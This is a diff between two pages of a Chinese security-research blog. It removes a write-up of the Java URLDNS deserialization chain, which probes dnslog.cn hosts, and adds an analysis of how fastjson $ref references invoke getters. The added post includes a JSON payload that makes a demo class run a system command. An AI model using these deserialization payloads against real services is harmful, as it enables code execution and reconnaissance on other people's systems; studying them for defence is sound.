@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>CC重启之URLDNS补课 | Godown_blog</title>
+  <title>fastjson $ref调用getter | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B888.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8112.png')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        CC重启之URLDNS补课
+        fastjson $ref调用getter
       </span>
     </div>
     
@@ -619,74 +619,102 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p>在写CC6的时候，发现后半截是URLDNS的链，来重新构造一遍URLDNS。</p>
-<p>他妈的，护网还被鸽了，面试是没挂过的，项目是没去过的。</p>
-<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><h3 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h3><p>漏洞触发点在InetAddress#getByName()能触发DNS解析</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211430126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211430126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>同样来自于InetAddress的getHostAddress调用了getByName方法。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211518306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211518306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>抽象类java.net.URLStreamHandler的hashCode调用了getHostAddress。注意这里是需要URL参数的hashCode()，而不是贼多方法都调用的那个无参hashCode()。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211715438.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211715438.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>这个有参hashCode只在URL类中使用</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717212309900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717212309900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>URL.hashCode()如下</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213805181.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213805181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>那我们如何传参向hashCode呢？handler已经定义为URLStreamHandler了，this是把当前对象传进去。</p>
+        <p>之前有分析到，fastjson识别setter的流程如下：</p>
+<p>按以下顺序判断，满足条件的话，会被当成setter调用：</p>
+<ul>
+<li>set开头，参数长度为1，非static，方法名总长度大于3</li>
+<li>没有setter方法，有字段是bool类型，则用<code>is</code>加上首字母大写后的字段去查找（所以isName这种也算setter）</li>
+<li>没有setter方法，有getter方法，参数长度为0，返回类型是属于Collection 或其子类、Map 或其子类、AtomicBoolean、AtomicInteger、AtomicLong的一种</li>
+</ul>
+<p>那有没有更通用的调用getter的办法呢？</p>
+<p>在Fastjson&gt;&#x3D;1.2.36时，可以用$ref的方式调用任意getter</p>
+<h2 id="ref"><a href="#ref" class="headerlink" title="$ref"></a>$ref</h2><p>$ref是fastjson里的引用，引用之前出现的对象</p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>{“$ref”:”$”}</td>
+<td>引用根对象</td>
+</tr>
+<tr>
+<td>{“$ref”:”@”}</td>
+<td>引用自己</td>
+</tr>
+<tr>
+<td>{“$ref”:”..”}</td>
+<td>引用父对象</td>
+</tr>
+<tr>
+<td>{“$ref”:”..&#x2F;..”}</td>
+<td>引用父对象的父对象</td>
+</tr>
+<tr>
+<td>{“$ref”:”$.members[0].reportTo”}</td>
+<td>基于路径的引用</td>
+</tr>
+</tbody></table>
+<p>写个Test类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用$ref的测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;com.yyds.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>$[0]</code>指的是前面生成的第一个对象，也就是Test</p>
+<p>这里只是测$ref的作用，开个autoType无所谓</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>JSON.parse会调用handleResovleTask</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160637063.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160637063.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024160637063"></p>
+<p>handleResovleTask会取出ref的内容，并判断是否以$开头，如果是，会先调用compile，然后eval</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160829609.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024160829609.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024160829609"></p>
+<p>compile就是拿JSONPath封装了一下，跟进到eval，eval先是调用init初始化，然后循环segments调用eval</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162005867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162005867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024162005867"></p>
+<p>进一步查看init，发现如果path不为<code>*</code>，则创建一个JSONPathParser，调用explain来解析路径</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162058533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162058533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024162058533"></p>
+<p>跟进到explain，解析处理如下：</p>
+<ul>
+<li><p>创建一个初始容量为8的Segment数组segments，调用readSegement读取下一个段，如果读到的是null则退出循环。</p>
+</li>
+<li><p>如果读取到的段是 PropertySegment 且其 propertyName 为 “*” 且 deep 为 false，则跳过该段。</p>
+</li>
+</ul>
+<p>将读取到的段添加到数组中，并增加 level 计数器。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162711492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024162711492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024162711492"></p>
+<p>其中readSegement会根据<code>.</code>分割path，童话刚刚readName取到key值（cmd），readName里面就一个toString</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163356608.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163356608.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163356608"></p>
+<p>最后segments就只有一个cmd，没有对应的value</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163608492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163608492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163608492"></p>
+<p>接着看init后的segment.eval，使用getPropertyValue获取value，怎么获取的呢？</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163649372.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163649372.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163649372"></p>
+<p>在getPropertyValue中，因为我们的Bean是一个自定义类，使用了getJavaBeanSerializer获取序列化器，然后调用getFieldValue</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163812999.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024163812999.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024163812999"></p>
+<p>这个Serializer是一个ASMSerializer，如果之前看过我的fastjson分析，就知道这后面的流程其实和JSON.toJSON的流程一样了</p>
+<p><a href="https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter">https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164904035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164904035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024164904035"></p>
+<p>getFieldValue进一步调用getPropertyValue</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164951200.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024164951200.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024164951200"></p>
+<p>然后调用get</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165046197.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165046197.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024165046197"></p>
+<p>然后反射执行getter</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165125865.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165125865.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024165125865"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果我们输出parse反序列化解析后的Object，发现<code>&#123;&quot;$ref&quot;:&quot;$[0].cmd&quot;&#125;</code>解析后的值是calc，这种引用的方式为了返回value，调用了getter</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165503636.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024165503636.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024165503636"></p>
+<h2 id="为什么1-2-35-ref不能触发"><a href="#为什么1-2-35-ref不能触发" class="headerlink" title="为什么1.2.35 $ref不能触发"></a>为什么1.2.35 $ref不能触发</h2><p>1.2.35的DefaultJSONParser.handleResolveTask不是直接调用JSONPath.eval</p>
+<p>而是判断了refValue需要为JSONObject类</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024170248058.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024170248058.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024170248058"></p>
 <blockquote>
-<p>在URL类中先声明了抽象类URLStreamHandler的变量，后面会根据协议选择用哪个子类来处理这个URL</p>
-<blockquote>
-<p>Java中可以先定义一个抽象类的变量，如URLStreamHandler handler，但不能用这个变量来实例化一个对象</p>
+<p>什么反向修复？</p>
 </blockquote>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717220034094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717220034094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-</blockquote>
-<p>URL有公开的构造函数，我们用最简单那个</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214433315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214433315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>我们用dnslog试一下（记得要加协议，构造函数传递到最后一个会进行判断）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://845yoh.dnslog.cn&quot;</span>);</span><br><span class="line">    url.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214722789.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214722789.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>完全是没问题</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214804868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214804868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="链接到readObject"><a href="#链接到readObject" class="headerlink" title="链接到readObject"></a>链接到readObject</h3><p>调用URL.hashCode()的地方很多</p>
-<p>官方给出的下一步是HashMap#hash()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213010355.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213010355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>正好在HashMap的readObject里调用了hash()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213130350.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213130350.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>读一下上面那张图最后一个循环，循环从map中读取key和value。我们搞一个key为url的map去反序列化就行了。</p>
-<p>我们先序列化</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://icguiixgku.dgrh3.cn&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现只是序列化就触发了DNS请求（我是太刀侠，提前预知了这里会DNS请求</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174318915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174318915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>发现在map.put的时候就调用了一遍hash</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174532780.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174532780.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>这没道理的，还没打到别人电脑上，DNS平台就有请求了，影响判断。我们得让put不触发dns请求</p>
-<blockquote>
-<p>至于为什么要通过反射修改URL类而不是HashMap类，是因为HashMap本身并没有提供直接修改key的方法。这是因为Map接口的设计原则之一就是key的不可变性，一旦一个键值对被放入Map中，它的键就不能改变。如果改变了key，那么Map就无法定位到原来的条目。</p>
-<p>如果你需要“修改”一个HashMap中的key，实际上的操作流程是：使用remove()方法移除旧的键值对。使用put()方法插入新的键值对。</p>
-<p>HashMap内键值对以Node的形式存储，链表链接，超过一定阈值还会变成红黑树</p>
-</blockquote>
-<p>再倒回来看URL#hashCode()，如果hashCode值不为-1，则直接返回。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719191216794.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719191216794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>那我们通过反射，在put前把值改为不等于-1，put后改为-1</p>
-<p>完整代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c6lmkl.dnslog.cn&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>现在就不会误报了。由于DNS缓存刷新时间的问题，你需要多发几次包或者等一会儿再运行。</p>
-<p>完整代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c6lmkl.dnslog.cn&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">    map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">    hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">    serialize(map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>漏洞应该是作者翻看URL这个与外界通信的类时发现的。有超多地方都调用的hashCode，仔细一看hashCode进一步进行了DNS解析。进一步寻找readObject触发到hashCode的链子。而不是作者从InetAddress开始找的，只是本文按顺序如此分析。</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/CC/" class="">
-              CC
+            <a href="/tags/fastjson/" class="">
+              fastjson
             </a>
           
         </div>
@@ -700,7 +728,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2024/07/19/urldns-bu-ke/" target="_blank" title="CC重启之URLDNS补课">https://godownio.github.io/2024/07/19/urldns-bu-ke/</a>
+    <a href="/2024/10/24/fastjson-ref-diao-yong-getter/" target="_blank" title="fastjson $ref调用getter">https://godownio.github.io/2024/10/24/fastjson-ref-diao-yong-getter/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -722,17 +750,16 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B889.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B889.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
     </div>
-    <a href="/2024/07/20/lei-urldns-de-cc6/" class="post-nav-link">
+    <a href="/2024/10/26/c3p0-lian/" class="post-nav-link">
       <div class="title">
         <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">CC重启之类URLDNS的CC6</div>
+        <div class="title-text">C3P0合集</div>
       </div>
       
       <!-- <div class="content">
-        CC6在上一篇文章的分析中
-https://godownio.github.io/2024/07/13/cc-chong
+        C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，目前使用它的开源项目有Hibernate，Spring
       </div> -->
     </a>
   </div>
@@ -743,17 +770,18 @@ https://godownio.github.io/2024/07/13/cc-chong
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B887.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B887.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8110.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8110.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/" class="post-nav-link">
+    <a href="/2024/10/21/groovy-lou-dong/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">CC重启之基于动态代理构造的LazyMap CC1及利用二次反序列化的修复</div>
+        <div class="title-text">Groovy漏洞</div>
       </div>
       <!-- <div class="content">
-        本文首发于https://www.freebuf.com/vuls/406123.html
-前置知识：
-Java动态代理
+        Groovy 是一种基于 Java 平台的面向对象语言。
+
+pom.xml：
+12345&lt;dependency&g
       </div> -->
     </a>
   </div>
@@ -891,7 +919,7 @@ Java动态代理
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
